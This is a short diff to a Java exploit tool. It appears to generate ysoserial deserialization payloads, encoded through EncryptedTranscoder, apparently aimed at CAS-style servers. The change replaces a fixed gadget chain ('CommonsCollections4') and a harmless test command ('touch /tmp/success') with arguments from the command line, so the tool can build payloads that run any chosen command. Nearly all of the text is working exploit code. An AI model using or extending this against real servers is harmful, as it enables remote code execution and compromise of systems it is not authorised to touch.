@@ -8,8 +8,8 @@ public class App
 {
     public static void main( String[] args ) throws Exception
     {
-        String type = "CommonsCollections4";
-        String command = "touch /tmp/success";
+        String type = args[0];
+        String command = args[1];
         EncryptedTranscoder et = new EncryptedTranscoder();
         Object obj = ObjectPayload.Utils.makePayloadObject(type, command);
         byte[] code = et.encode(obj);
